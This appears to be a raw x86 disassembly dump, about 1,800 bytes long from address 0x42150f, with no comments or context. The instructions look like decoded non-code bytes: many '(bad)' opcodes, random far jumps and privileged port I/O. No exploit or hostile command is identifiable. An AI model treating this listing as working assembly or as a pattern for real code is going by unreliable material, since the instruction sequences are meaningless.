  42150f:	xor    DWORD PTR [ebp+0x64],esi
  421512:	les    esp,FWORD PTR [edx+0x55]
  421515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421516:	out    dx,al
  421517:	cmp    eax,0x3742c245
  42151c:	pop    ds
  42151d:	adc    eax,0xc9e013c8
  421522:	jge    0x421562
  421524:	ds jmp 0x421528
  421527:	push   ss
  421528:	pop    ebp
  421529:	sti    
  42152a:	(bad)  
  42152c:	jmp    0x42156b
  42152e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42152f:	imul   eax,DWORD PTR [eax],0xffffff90
  421532:	inc    edx
  421533:	(bad)  
  421534:	sbb    al,BYTE PTR [esi+0x4a]
  421537:	cmp    DWORD PTR [edi],edx
  421539:	inc    esi
  42153a:	xchg   edx,eax
  42153b:	js     0x42155c
  42153d:	xchg   edi,eax
  42153e:	jge    0x4215a2
  421540:	in     eax,0x6d
  421542:	(bad)  
  421543:	loope  0x4215be
  421545:	adc    eax,0x9cc4a2e5
  42154a:	cld    
  42154b:	xlat   BYTE PTR ds:[ebx]
  42154c:	(bad)  
  42154d:	dec    ebp
  42154e:	adc    dh,BYTE PTR [ebp+0x7e0d596b]
  421554:	jb     0x4214f0
  421556:	mov    eax,ds:0x698203af
  42155b:	mov    ecx,0x3760148c
  421560:	scas   eax,DWORD PTR es:[edi]
  421561:	mov    al,ds:0xab4939a6
  421566:	add    bh,dh
  421568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421569:	push   0x1d
  42156b:	int3   
  42156c:	aaa    
  42156d:	push   edi
  42156e:	lds    esi,FWORD PTR [esi]
  421570:	add    al,0xb9
  421572:	or     cl,BYTE PTR [edi*4+0x28465ca3]
  421579:	jmp    0xc9a045a1
  42157e:	sbb    eax,esi
  421580:	(bad)  
  421581:	jle    0x421517
  421583:	in     al,dx
  421584:	jg     0x42152f
  421586:	int3   
  421587:	xchg   esp,eax
  421588:	adc    al,0x46
  42158a:	fidivr DWORD PTR [esi+0x42295873]
  421590:	int3   
  421591:	popa   
  421592:	cmp    bl,BYTE PTR [eax]
  421594:	sbb    DWORD PTR ds:0x29c5c783,0x6de1193c
  42159e:	jmp    0xec82:0xedb859f7
  4215a5:	pop    esp
  4215a6:	ds mov al,0x24
  4215a9:	xor    eax,0x6ca61dcb
  4215ae:	aam    0x49
  4215b0:	adc    DWORD PTR [edx+0x70],edx
  4215b3:	or     ebx,DWORD PTR [ebx+0x278bda7f]
  4215b9:	cmp    BYTE PTR [esi+ebp*1-0xbb24e98],dl
  4215c0:	(bad)  
  4215c1:	fidivr WORD PTR [ebx+0x79]
  4215c4:	(bad)  
  4215c5:	pop    edx
  4215c6:	adc    esi,DWORD PTR [ebp-0x4f0f3afe]
  4215cc:	jp     0x421634
  4215ce:	xor    eax,0x4961b9b7
  4215d3:	mov    eax,ds:0x94e8bde6
  4215d8:	add    eax,0x2b928017
  4215dd:	fimul  WORD PTR [edx]
  4215df:	daa    
  4215e0:	jp     0x421629
  4215e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215e3:	ret    0xc2e6
  4215e6:	mul    BYTE PTR [ebx-0x205de302]
  4215ec:	inc    ebx
  4215ed:	std    
  4215ee:	inc    edi
  4215ef:	sub    eax,DWORD PTR [esp+ecx*1-0xbe0d8f3]
  4215f6:	aaa    
  4215f7:	adc    dh,al
  4215f9:	mov    al,ds:0x135a6412
  4215fe:	adc    BYTE PTR [ecx*8+0x556d6b49],dl
  421605:	out    dx,al
  421606:	push   cs
  421607:	adc    DWORD PTR [edi-0x6c],ebp
  42160a:	mov    ecx,0x646ea7fc
  42160f:	pop    ds
  421610:	stos   BYTE PTR es:[edi],al
  421611:	into   
  421612:	dec    ebx
  421613:	mov    ds:0x31f14894,al
  421618:	ja     0x4215bb
  42161a:	mov    dh,0x76
  42161c:	(bad)  
  42161d:	imul   eax,edi,0xb7ab43e7
  421623:	rcr    ebx,1
  421625:	outs   dx,BYTE PTR ds:[esi]
  421626:	adc    eax,0xe8780ef7
  42162b:	lds    ecx,FWORD PTR [ebx+0x34e91edb]
  421631:	jecxz  0x4215b9
  421633:	daa    
  421634:	adc    esi,DWORD PTR [esi+0x1]
  421637:	xor    al,0xae
  421639:	ss retf 
  42163b:	(bad)  
  42163c:	mov    bh,0x2a
  42163e:	sub    bh,bh
  421640:	sbb    BYTE PTR [eax-0x31],ch
  421643:	js     0x4216bb
  421645:	mov    eax,ds:0x71699e2e
  42164a:	ins    DWORD PTR es:[edi],dx
  42164b:	sbb    ch,BYTE PTR [ebp-0x176ef285]
  421651:	jnp    0x421607
  421653:	xor    al,bh
  421655:	sub    eax,DWORD PTR [esi]
  421657:	dec    edx
  421658:	into   
  421659:	sbb    esi,DWORD PTR [eax]
  42165b:	clc    
  42165c:	mov    ah,0x6e
  42165e:	inc    esi
  42165f:	push   ss
  421660:	push   0x27
  421662:	(bad)  
  421663:	bound  esi,QWORD PTR [ecx-0x55]
  421666:	aas    
  421667:	jno    0x4216b7
  421669:	add    BYTE PTR [edi-0x52521762],cl
  42166f:	je     0x4216e9
  421671:	mov    ah,0x54
  421673:	fidiv  DWORD PTR [edx+esi*1]
  421676:	lock jno 0x421681
  421679:	jnp    0x421691
  42167b:	cli    
  42167c:	xor    DWORD PTR [edi+0x6b],edx
  42167f:	repnz mov eax,0x3420cf4f
  421685:	test   BYTE PTR [edx],ch
  421687:	repnz push edi
  421689:	pop    es
  42168a:	test   DWORD PTR [eax+0x1cbd3a6],eax
  421690:	jo     0x4216fd
  421692:	aad    0xb4
  421694:	fld    TBYTE PTR [eax+eiz*2]
  421697:	or     al,dl
  421699:	push   0x3c
  42169b:	fistp  DWORD PTR [ebx-0x3471b5ed]
  4216a1:	je     0x4216ba
  4216a3:	adc    eax,0x4b8a9e95
  4216a8:	fist   DWORD PTR [ebx+0x1d]
  4216ab:	mov    ebx,0x63064044
  4216b0:	cmp    ebx,edi
  4216b2:	sbb    ebp,edx
  4216b4:	adc    ebp,DWORD PTR [esi-0x75da9306]
  4216ba:	(bad)  
  4216bc:	imul   ebp,ebp,0x6d
  4216bf:	cmp    BYTE PTR [ebx+ebp*1-0x44d9adc2],ah
  4216c6:	cs out dx,al
  4216c8:	repnz dec eax
  4216ca:	mov    ecx,0xf5ad9eb4
  4216cf:	leave  
  4216d0:	pop    ebp
  4216d1:	xor    edi,DWORD PTR [ecx]
  4216d3:	mov    DWORD PTR [edi],ecx
  4216d5:	outs   dx,BYTE PTR ds:[esi]
  4216d6:	(bad)  
  4216d7:	jmp    0x93f6:0x6f55532f
  4216de:	add    DWORD PTR [ebx+edi*8+0x9ee9266],edi
  4216e5:	pop    ds
  4216e6:	icebp  
  4216e7:	cmp    DWORD PTR [eax-0x87a0830],edx
  4216ed:	(bad)  
  4216ee:	cld    
  4216ef:	push   0x9722fbf5
  4216f4:	(bad)  
  4216f5:	imul   edx,DWORD PTR ds:0x30f761e3,0xffffffae
  4216fc:	and    DWORD PTR [ebx],ebx
  4216fe:	inc    ebx
  4216ff:	mov    bl,0xb6
  421701:	fldenv [ecx]
  421703:	push   cs
  421704:	popa   
  421705:	xchg   esp,eax
  421706:	xchg   BYTE PTR [edx+0x73],dl
  421709:	sbb    eax,0x2082d0b9
  42170e:	cmp    eax,0x9904be40
  421713:	repnz daa 
  421715:	das    
  421716:	mov    bh,0x88
  421718:	outs   dx,DWORD PTR ds:[esi]
  421719:	or     ah,BYTE PTR [esi+esi*2+0x36323697]
  421720:	out    dx,eax
  421721:	outs   dx,DWORD PTR ds:[esi]
  421722:	in     al,dx
  421723:	cmp    edx,DWORD PTR [ebx-0x6a644d1d]
  421729:	loope  0x4216b2
  42172b:	scas   eax,DWORD PTR es:[edi]
  42172c:	bound  ebp,QWORD PTR [ecx-0x2e42986]
  421732:	xlat   BYTE PTR ds:[ebx]
  421733:	stos   DWORD PTR es:[edi],eax
  421734:	adc    BYTE PTR [edi+0x7b],al
  421737:	or     ebx,0x7
  42173a:	mov    esi,0x84922b24
  42173f:	mov    dh,0x72
  421741:	pop    eax
  421742:	les    esi,FWORD PTR [edx+0x58]
  421745:	xchg   DWORD PTR [edx+0xe],eax
  421748:	or     dl,cl
  42174a:	rol    DWORD PTR ds:0x48d8b737,cl
  421750:	xchg   ecx,eax
  421751:	and    BYTE PTR [eax+0x70],dl
  421754:	xchg   edi,eax
  421755:	je     0x421700
  421757:	clc    
  421758:	inc    ecx
  421759:	mov    eax,ds:0x10bf2219
  42175e:	dec    esp
  42175f:	fwait
  421760:	cmp    eax,0x3c565732
  421765:	sbb    DWORD PTR [ebp+0x434f0502],ebx
  42176b:	push   esi
  42176c:	fwait
  42176d:	lea    ebp,[ebp-0x6a]
  421770:	pop    esi
  421771:	or     BYTE PTR [edx],al
  421773:	daa    
  421774:	jbe    0x421765
  421776:	in     al,0x18
  421778:	sub    esi,ebx
  42177a:	mov    es,WORD PTR [ecx+ebp*4]
  42177d:	jbe    0x42179e
  42177f:	jbe    0x421708
  421781:	jl     0x421796
  421783:	aad    0xc3
  421785:	push   0xffffffab
  421787:	(bad)
  42178a:	stc    
  42178b:	aaa    
  42178c:	sub    BYTE PTR [ecx+0x4f],ch
  42178f:	ror    DWORD PTR [ebp+0x2114f7f3],0x6b
  421796:	fcom   QWORD PTR [ebp+0x3a]
  421799:	lea    ebx,ds:[eax]
  42179c:	pop    ebp
  42179d:	push   ebp
  42179e:	hlt    
  42179f:	stos   DWORD PTR es:[edi],eax
  4217a0:	mov    bh,0x6e
  4217a2:	dec    esp
  4217a3:	jg     0x4217fd
  4217a5:	call   FWORD PTR [eax+0x4e4d38cc]
  4217ab:	jg     0x4217bf
  4217ad:	push   es
  4217ae:	test   esi,ebp
  4217b0:	sbb    BYTE PTR [eax*2-0x116eab46],0xaa
  4217b8:	dec    ebx
  4217b9:	es in  eax,0x59
  4217bc:	mov    BYTE PTR [esi-0x52],0x9f
  4217c0:	call   0x14fe4068
  4217c5:	in     eax,0x35
  4217c7:	iret   
  4217c8:	imul   eax,ecx,0x311a37bb
  4217ce:	mov    ah,0x69
  4217d0:	mov    bl,dh
  4217d2:	sub    dl,BYTE PTR [eax-0x489e2c68]
  4217d8:	fstp   TBYTE PTR [edx+0x53]
  4217db:	mov    ecx,0x96c87f5e
  4217e0:	dec    esp
  4217e1:	call   0x321c:0x71654db8
  4217e8:	add    al,BYTE PTR [eax+0x18]
  4217eb:	outs   dx,DWORD PTR ds:[esi]
  4217ec:	mov    ds:0x2c0a6,al
  4217f1:	gs fst st(0)
  4217f4:	gs stos BYTE PTR es:[edi],al
  4217f6:	and    dh,BYTE PTR [edx]
  4217f8:	add    BYTE PTR [esi+edi*4+0x65bf503d],cl
  4217ff:	inc    edi
  421800:	int    0x14
  421802:	and    al,BYTE PTR [ebp-0x5b291315]
  421808:	push   ds
  421809:	data16 mov dh,0xd3
  42180c:	scas   al,BYTE PTR es:[edi]
  42180d:	push   ebx
  42180e:	sub    BYTE PTR [ebx],dl
  421810:	mov    fs,WORD PTR [ebx-0x40807ad1]
  421816:	cmp    BYTE PTR [eax],cl
  421818:	lods   eax,DWORD PTR ds:[esi]
  421819:	mov    ds,WORD PTR fs:[ecx]
  42181c:	pop    ss
  42181d:	or     esp,DWORD PTR [esi]
  42181f:	xchg   cx,ax
  421821:	out    0x50,eax
  421823:	iret   
  421824:	icebp  
  421825:	mov    ebx,0x97de97fd
  42182a:	pop    esi
  42182b:	jns    0x4217b6
  42182d:	ret    0xd8f8
  421830:	and    BYTE PTR [ecx+0x7f1ef684],ah
  421836:	fistp  WORD PTR [esi+0x7ed4ca05]
  42183c:	ins    BYTE PTR es:[edi],dx
  42183d:	adc    al,0x63
  42183f:	pop    eax
  421840:	dec    ebx
  421841:	outs   dx,BYTE PTR ds:[esi]
  421842:	pop    edx
  421843:	ins    BYTE PTR es:[edi],dx
  421844:	or     eax,0xa97133a3
  421849:	stos   DWORD PTR es:[edi],eax
  42184a:	je     0x42187d
  42184c:	mov    ds:0x8b01e2b9,al
  421851:	push   esi
  421852:	or     BYTE PTR [esi],0xfe
  421855:	aad    0xf1
  421857:	cld    
  421858:	jbe    0x421837
  42185a:	mov    esp,0xe4e3326e
  42185f:	aad    0xb6
  421861:	mov    esi,0x119fb852
  421866:	mov    cl,0x5
  421868:	cli    
  421869:	js     0x4218b7
  42186b:	loop   0x42182d
  42186d:	data16 mov al,ds:0xc1d92c6e
  421873:	ds xchg ebp,eax
  421875:	fild   QWORD PTR [ebx-0x67]
  421878:	push   0xffffff85
  42187a:	xor    DWORD PTR [ecx+0x45],esi
  42187d:	leave  
  42187e:	adc    al,0x53
  421880:	cdq    
  421881:	cmp    al,0x3b
  421883:	xchg   ebx,eax
  421884:	sub    DWORD PTR [edi+0x33],esi
  421887:	(bad)  
  421888:	and    eax,0xc03ceed5
  42188d:	fcomp  DWORD PTR [eax]
  42188f:	jb     0x4218c2
  421891:	jmp    FWORD PTR [ebp-0x92dccb8]
  421897:	imul   di,bp,0x7011
  42189c:	out    0xde,eax
  42189e:	and    al,0xed
  4218a0:	fmul   DWORD PTR ds:0xac7ac17
  4218a6:	xchg   esp,eax
  4218a7:	fisubr WORD PTR [edx+eiz*4-0x6942b43c]
  4218ae:	in     al,dx
  4218af:	rcl    DWORD PTR [ebx],0xf
  4218b2:	dec    edx
  4218b3:	cmp    eax,0xaab76059
  4218b8:	add    dl,dl
  4218ba:	ret    0xb299
  4218bd:	out    0xf8,eax
  4218bf:	loope  0x4218d1
  4218c1:	repnz sbb ch,dh
  4218c4:	ror    DWORD PTR [eax+esi*4-0x14961148],cl
  4218cb:	push   esp
  4218cc:	or     BYTE PTR [esi-0x64],ah
  4218cf:	xchg   esp,eax
  4218d0:	push   ds
  4218d1:	push   0x53b3689b
  4218d6:	sar    BYTE PTR [esi+0x70],cl
  4218d9:	pop    ecx
  4218da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218db:	retf   
  4218dc:	mov    ds:0xd60c3ba,al
  4218e1:	xchg   ecx,eax
  4218e2:	mov    esp,0x670ed861
  4218e7:	(bad)  
  4218e8:	and    ebx,esi
  4218ea:	retf   0xe916
  4218ed:	lods   eax,DWORD PTR ds:[esi]
  4218ee:	shl    edx,cl
  4218f0:	into   
  4218f1:	inc    eax
  4218f2:	in     eax,0x85
  4218f4:	hlt    
  4218f5:	aam    0xdf
  4218f7:	call   0x3f22:0x3d3064f0
  4218fe:	xchg   esi,eax
  4218ff:	xor    al,0x6e
  421901:	jmp    0x4218f0
  421903:	adc    al,BYTE PTR [edx+0x10523c96]
  421909:	sub    DWORD PTR ds:0xe3dc1eaa,0xffffffab
  421910:	mov    edi,0xfbfa0b99
  421915:	pop    esp
  421916:	xor    esp,DWORD PTR [esp+edi*8]
  421919:	mov    ah,0xd6
  42191b:	test   DWORD PTR [eax-0x3a01b025],esi
  421921:	out    0xca,eax
  421923:	cmp    eax,0xb1892f19
  421928:	ss int3 
  42192a:	cmp    edi,ebp
  42192c:	sub    DWORD PTR [edi+0x39],edx
  42192f:	cli    
  421930:	lock sub al,0xc7
  421933:	aaa    
  421934:	lea    esp,[edi+ebx*8]
  421937:	sbb    ah,dl
  421939:	cmc    
  42193a:	ffree  st(3)
  42193d:	add    al,0x71
  42193f:	or     al,0x2e
  421941:	bound  eax,QWORD PTR [edi-0x1918cdac]
  421947:	cmp    al,0xca
  421949:	pop    ecx
  42194a:	ja     0x42192e
  42194c:	cwde   
  42194d:	adc    BYTE PTR [ecx+0x57f668c4],cl
  421953:	mov    esi,0x713a1d9b
  421958:	jo     0x421969
  42195a:	cld    
  42195b:	mov    edi,0x2f1835e6
  421960:	or     ah,dl
  421962:	and    dl,BYTE PTR [esi+0x427344ac]
  421968:	dec    ebp
  421969:	test   esp,ebx
  42196b:	mov    WORD PTR [ebx-0x2f358535],ds
  421971:	out    0xe2,eax
  421973:	rcl    DWORD PTR [esi+esi*4],1
  421976:	in     eax,dx
  421977:	pop    es
  421978:	push   edx
  421979:	or     cl,bl
  42197b:	or     eax,0x8ba56193
  421980:	(bad)  
  421981:	xor    dl,BYTE PTR [eax]
  421983:	push   0xffffffee
  421985:	fmul   QWORD PTR [ecx-0x55b978c1]
  42198b:	cld    
  42198c:	scas   eax,DWORD PTR es:[edi]
  42198d:	icebp  
  42198e:	lods   al,BYTE PTR ds:[esi]
  42198f:	jecxz  0x42193b
  421991:	jb     0x421955
  421993:	shr    esi,0x2e
  421996:	lds    esp,FWORD PTR [ebx+0x56166367]
  42199c:	repz pop ebp
  42199e:	or     ch,bh
  4219a0:	adc    DWORD PTR [ebp+0x3865b194],0xffffff99
  4219a7:	xchg   ecx,eax
  4219a8:	sbb    dl,BYTE PTR [edi-0x19]
  4219ab:	and    DWORD PTR [eax+edx*2+0x4b],edx
  4219af:	(bad)  
  4219b0:	stos   BYTE PTR es:[edi],al
  4219b1:	dec    ecx
  4219b2:	pop    ecx
  4219b3:	pop    esi
  4219b4:	stos   DWORD PTR es:[edi],eax
  4219b5:	xchg   esp,eax
  4219b6:	xchg   DWORD PTR [ebx],esi
  4219b8:	adc    esi,DWORD PTR [ebx-0x68f87030]
  4219be:	inc    ebp
  4219bf:	sbb    BYTE PTR [ebp-0x3fd5918f],ah
  4219c5:	lods   al,BYTE PTR ds:[esi]
  4219c6:	sub    cl,BYTE PTR [esi-0x63]
  4219c9:	add    DWORD PTR [esi],edi
  4219cb:	xchg   BYTE PTR fs:[eax],dh
  4219ce:	fisub  DWORD PTR [edx+0x24]
  4219d1:	call   0xf0e2:0xdce718a8
  4219d8:	jp     0x421a58
  4219da:	pop    edx
  4219db:	es add cl,ah
  4219de:	stc    
  4219df:	mov    ah,0x45
  4219e1:	loop   0x4219ae
  4219e3:	mov    ah,0x96
  4219e5:	mov    ah,0x20
  4219e7:	mov    al,ds:0x82685767
  4219ec:	cmp    BYTE PTR [ebx],dl
  4219ee:	std    
  4219ef:	lock dec edi
  4219f1:	push   ss
  4219f2:	jmp    0x421a3a
  4219f4:	lahf   
  4219f5:	fstp   TBYTE PTR [edx+0x43fdf6f0]
  4219fb:	dec    eax
  4219fc:	fdivr  QWORD PTR [ebp+0x52bc9abb]
  421a02:	out    0xd9,eax
  421a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a05:	pop    ecx
  421a06:	and    BYTE PTR [eax-0xe70a1f7],dh
  421a0c:	dec    edi
  421a0d:	into   
  421a0e:	(bad)
  421a11:	mov    cl,0x64
  421a13:	fstp   DWORD PTR [edi+esi*4-0x4654881a]
  421a1a:	mov    WORD PTR [eax],ds
  421a1c:	adc    edi,DWORD PTR [ebx-0x64f07caf]
  421a22:	adc    esi,0x5
  421a25:	fidiv  DWORD PTR [ebp+0xb]
  421a28:	adc    BYTE PTR [eax+0x14b73018],ch
  421a2e:	retf   
  421a2f:	js     0x421a6d
  421a31:	inc    edx
  421a32:	mov    ds:0x1bcec6e4,eax
  421a37:	retf   
  421a38:	enter  0x1b02,0xe7
  421a3c:	push   ecx
  421a3d:	jmp    0x421a2c
  421a3f:	sub    DWORD PTR [edi+0x2047cec7],ebp
  421a45:	push   ebp
  421a46:	retf   
  421a47:	xchg   ebp,eax
  421a48:	loop   0x421a36
  421a4a:	aas    
  421a4b:	pop    esp
  421a4c:	adc    ecx,DWORD PTR [eax-0x51]
  421a4f:	(bad)  
  421a50:	aad    0x12
  421a52:	stos   DWORD PTR es:[edi],eax
  421a53:	dec    esi
  421a54:	cld    
  421a55:	jnp    0x421a86
  421a57:	sbb    al,0x63
  421a59:	inc    esp
  421a5a:	cli    
  421a5b:	dec    edi
  421a5c:	pop    ebp
  421a5d:	adc    BYTE PTR [edx+0x6a],dh
  421a60:	dec    edi
  421a61:	mov    ebp,DWORD PTR [ecx]
  421a63:	sub    ebp,DWORD PTR [ecx+0x7d]
  421a66:	ss shl dh,1
  421a69:	cdq    
  421a6a:	pop    edi
  421a6b:	jae    0x421a40
  421a6d:	call   FWORD PTR [ecx+eiz*8-0x3e7e42cb]
  421a74:	pop    ecx
  421a75:	xchg   ecx,eax
  421a76:	mov    ebx,0x69177f86
  421a7b:	mov    esi,0xd55302e9
  421a80:	pop    es
  421a81:	sbb    dh,bh
  421a83:	jmp    DWORD PTR [esp+edi*1-0x67]
  421a87:	xor    eax,0xf62924a6
  421a8c:	popa   
  421a8d:	icebp  
  421a8e:	clc    
  421a8f:	inc    ebx
  421a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a91:	push   esp
  421a92:	push   esi
  421a93:	mov    ch,0x68
  421a95:	arpl   WORD PTR [esi],ax
  421a97:	push   0x39574cc8
  421a9c:	pop    es
  421a9d:	fisttp DWORD PTR [edx*2-0x488177eb]
  421aa4:	adc    BYTE PTR ds:0x2efd81a4,al
  421aaa:	int3   
  421aab:	cmp    ebx,DWORD PTR [ebx]
  421aad:	jl     0x421a4f
  421aaf:	xchg   ebx,eax
  421ab0:	jb     0x421b1c
  421ab2:	push   es
  421ab3:	inc    esp
  421ab4:	xor    BYTE PTR [ecx-0x4b],bh
  421ab7:	push   esp
  421ab8:	rcr    BYTE PTR [edx],1
  421aba:	ror    dl,1
  421abc:	jp     0x421aca
  421abe:	push   ds
  421abf:	les    esi,FWORD PTR [edi-0x58981316]
  421ac5:	mov    ebx,0xa18a8402
  421aca:	xchg   edx,eax
  421acb:	cmp    dh,al
  421acd:	xchg   esi,eax
  421ace:	cld    
  421acf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ad0:	and    BYTE PTR [ecx-0x6d],dh
  421ad3:	test   DWORD PTR [ebx+0x5640cd0],esp
  421ad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ada:	cmp    DWORD PTR [ebp-0x70],ecx
  421add:	int    0x85
  421adf:	lods   eax,DWORD PTR ds:[esi]
  421ae0:	jecxz  0x421aa2
  421ae2:	in     eax,dx
  421ae3:	sbb    BYTE PTR [esi+ebp*8-0x56298129],bh
  421aea:	jne    0x421b17
  421aec:	fbld   TBYTE PTR [eax]
  421aee:	mov    al,BYTE PTR [edi-0x2235d3b5]
  421af4:	dec    esp
  421af5:	adc    al,0xd7
  421af7:	(bad)  
  421af8:	repnz out dx,al
  421afa:	out    dx,al
  421afb:	pop    ebp
  421afc:	xor    ebx,DWORD PTR [esi]
  421afe:	jp     0x421b1e
  421b00:	push   ebx
  421b01:	xchg   ecx,eax
  421b02:	xchg   BYTE PTR [edi-0x4b],ch
  421b05:	add    al,BYTE PTR [edi+eiz*2-0x1457fdf0]
  421b0c:	ins    DWORD PTR es:[edi],dx
  421b0d:	(bad)  
  421b0e:	jmp    0x421acd
  421b10:	mov    ds:0x62532d12,al
  421b15:	sar    DWORD PTR [edi],1
  421b17:	rol    DWORD PTR [edx+0x64],cl
  421b1a:	jge    0x421ac3
  421b1c:	div    BYTE PTR [edi-0x743dcbf7]
  421b22:	retf   
  421b23:	cli    
  421b24:	pushf  
  421b25:	(bad)  [eax-0x16ab5691]
  421b2b:	retf   0xea0
  421b2e:	imul   esp,DWORD PTR [edi-0x12],0x65
  421b32:	cmp    al,0x83
  421b34:	pop    ds
  421b35:	inc    ebx
  421b36:	pop    ds
  421b37:	in     eax,0x6c
  421b39:	dec    edi
  421b3a:	(bad)  
  421b3b:	jmp    0x2a21c92f
  421b40:	jge    0x421b55
  421b42:	test   eax,0x5a7446fe
  421b47:	pop    esi
  421b48:	mov    ecx,0x1412a791
  421b4d:	or     ch,al
  421b4f:	ss pop edx
  421b51:	stos   DWORD PTR es:[edi],eax
  421b52:	(bad)  
  421b53:	ja     0x421b31
  421b55:	das    
  421b56:	dec    ecx
  421b57:	rcl    BYTE PTR [ecx-0x2af876b6],cl
  421b5d:	cmp    al,dl
  421b5f:	fwait
  421b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b61:	inc    eax
  421b62:	fs and bl,ch
  421b65:	add    BYTE PTR [edi+0x6d],0x5
  421b69:	in     eax,dx
  421b6a:	jnp    0x421b19
  421b6c:	test   DWORD PTR fs:0x6c7b57ae,ebp
  421b73:	dec    ebx
  421b74:	popa   
  421b75:	cmp    BYTE PTR [ecx],0xd2
  421b78:	in     al,dx
  421b79:	and    eax,0x4c6d3d03
  421b7e:	stos   BYTE PTR es:[edi],al
  421b7f:	jle    0x421b0a
  421b81:	leave  
  421b82:	xor    dh,BYTE PTR [edx+0x27]
  421b85:	push   edi
  421b86:	lea    ebx,[eax]
  421b88:	mov    ds:0xbad2a0d7,eax
  421b8d:	sbb    BYTE PTR [ebp+0x60d6f4e5],bh
  421b93:	jle    0x421b7a
  421b95:	imul   DWORD PTR [edx]
  421b97:	or     DWORD PTR [ebx],ebp
  421b99:	in     al,dx
  421b9a:	aam    0xc2
  421b9c:	pop    edx
  421b9d:	(bad)  
  421b9e:	jbe    0x421b53
  421ba0:	shl    edx,1
  421ba2:	mov    dh,al
  421ba4:	sar    edi,0x23
  421ba7:	stos   BYTE PTR es:[edi],al
  421ba8:	adc    BYTE PTR [esp+eax*1+0x6202b59d],0x40
  421bb0:	ror    BYTE PTR [eax+0x7560e253],0x77
  421bb7:	cdq    
  421bb8:	sub    DWORD PTR [edx+0x6c9e4a83],ebx
  421bbe:	ds inc eax
  421bc0:	jge    0x421b7e
  421bc2:	clc    
  421bc3:	call   0xdc3c29e4
  421bc8:	and    dh,BYTE PTR [esi+0xc]
  421bcb:	mov    ah,0x99
  421bcd:	pop    ecx
  421bce:	push   ds
  421bcf:	pop    eax
  421bd0:	xchg   ebp,eax
  421bd1:	xchg   DWORD PTR es:[ecx+0x20],ebx
  421bd5:	rol    DWORD PTR [edx-0x78],0x9b
  421bd9:	xor    BYTE PTR [edi-0x48],dh
  421bdc:	shl    ebp,cl
  421bde:	xor    eax,0x8cd0eb7f
  421be3:	mov    esi,0xe178548c
  421be8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421be9:	jb     0x421bc2
  421beb:	stos   BYTE PTR es:[edi],al
  421bec:	mov    ecx,0x4045150f
  421bf1:	fidivr DWORD PTR [edi+0x5de742e3]
  421bf7:	mov    esi,0xdd635c6a
  421bfc:	sbb    dh,BYTE PTR [edx-0x74]
  421bff:	mov    ds:0x3904d47e,al
  421c04:	in     al,0xb7
  421c06:	and    cl,BYTE PTR [ecx+0x16]
  421c09:	(bad)  
  421c0a:	xchg   edi,eax
  421c0b:	mov    esi,0xffb1506f
  421c10:	shl    DWORD PTR [ebx+eax*1-0x170807eb],cl
  421c17:	cdq    
  421c18:	xchg   edi,eax
  421c19:	xchg   esi,eax
  421c1a:	push   0x475a3e88
  421c1f:	jmp    0x421bf8
  421c21:	ins    DWORD PTR es:[edi],dx
  421c22:	inc    esp
  421c23:	push   cs
  421c24:	jle    0x421c07
  421c26:	js     0x421c35
  421c28:	push   0x8f91f6fc
  421c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c2e:	rcl    DWORD PTR [edx+edi*1-0x4d],1
  421c32:	cs dec eax
  421c34:	or     bh,BYTE PTR [ebp+0x17]
  421c37:	mov    eax,0xffc6a3de
  421c3c:	inc    ebp
  421c3d:	aas    
  421c3e:	pop    es
  421c3f:	div    BYTE PTR [edx]
  421c41:	addr16 out 0xe1,al
  421c44:	sbb    BYTE PTR [esi-0x2996c098],al
  421c4a:	push   cs
  421c4b:	repz and eax,0xa20d9ae2
  421c51:	(bad)  
  421c52:	je     0x421c02
  421c54:	adc    BYTE PTR [esi],al
  421c56:	jno    0x421c4a
  421c58:	sbb    bl,dh
  421c5a:	(bad)  
  421c5b:	mov    ebp,0x54abddec
  421c60:	jbe    0x421bed
  421c62:	jle    0x421c45
  421c64:	xor    edx,DWORD PTR [eax]
  421c66:	(bad)  
  421c67:	cld    
  421c68:	fld    DWORD PTR [eax+0x27]
  421c6b:	inc    ebx
  421c6c:	stc    
  421c6d:	and    DWORD PTR [eax+0xa300296],esp
  421c73:	(bad)  
  421c74:	out    0xaf,al
  421c76:	cmc    
  421c77:	xor    ecx,ebx
  421c79:	sbb    eax,0xdf3295b2
  421c7e:	dec    esi
  421c7f:	and    eax,0x39c340e
  421c84:	stos   BYTE PTR es:[edi],al
  421c85:	out    dx,al
  421c86:	int    0x7c
  421c88:	ss and al,0x7a
  421c8b:	popa   
  421c8c:	dec    ecx
  421c8d:	sub    al,0xb5
  421c8f:	mov    edi,0x77b090b
  421c94:	push   edx
  421c95:	and    BYTE PTR [esi+ecx*8],ah
  421c98:	pop    ebx
  421c99:	mov    ebx,0x47955f8
  421c9e:	mov    DWORD PTR [edi+0x4a],ebx
  421ca1:	xchg   edi,eax
  421ca2:	mov    DWORD PTR [ebx+edi*2+0x2c],esp
  421ca6:	rcr    BYTE PTR [edi],1
  421ca8:	jns    0x421c8b
  421caa:	dec    ebx
  421cab:	jae    0x421c38
  421cad:	ficom  DWORD PTR [ebx]
  421caf:	pop    ebx
  421cb0:	push   cs
  421cb1:	out    0x2d,eax
  421cb3:	out    0x41,al
  421cb5:	das    
  421cb6:	cmp    eax,0x26d7900b
  421cbb:	xor    esp,DWORD PTR [eax+0x7aeaf8d3]
  421cc1:	aad    0x14
  421cc3:	fmul   DWORD PTR [ebx]
  421cc5:	dec    ebp
  421cc6:	mov    esi,DWORD PTR [edx]
  421cc8:	icebp  
  421cc9:	jle    0x421c51
  421ccb:	mov    eax,ds:0x3537e059
  421cd0:	mov    BYTE PTR [edx+0x7a],ch
  421cd3:	pushf  
  421cd4:	popa   
  421cd5:	mov    dh,0x41
  421cd7:	retf   
  421cd8:	inc    ebx
  421cd9:	adc    bl,BYTE PTR [edx+0x77]
  421cdc:	pop    ecx
  421cdd:	sbb    cl,BYTE PTR [eax+0x55]
